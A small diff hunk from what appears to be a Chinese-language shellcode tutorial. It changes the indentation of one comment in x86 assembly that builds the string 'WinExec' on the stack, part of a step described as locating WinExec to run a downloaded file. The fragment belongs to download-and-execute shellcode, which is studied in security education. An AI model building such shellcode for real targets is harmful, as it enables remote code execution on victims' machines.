@@ -379,7 +379,7 @@
   + 找到`WinExec`函数的入口地址，并调用该函数运行下载的文件，最后退出程序
 
     ```asm
-     Create string 'WinExec\x00' on the stack and save its address to the stack-frame
+    Create string 'WinExec\x00' on the stack and save its address to the stack-frame
     mov edx, 0x63657878     \
     shr edx, 8              ; Shifts edx register to the right 8 bits
     push edx                ; "\x00,cex"
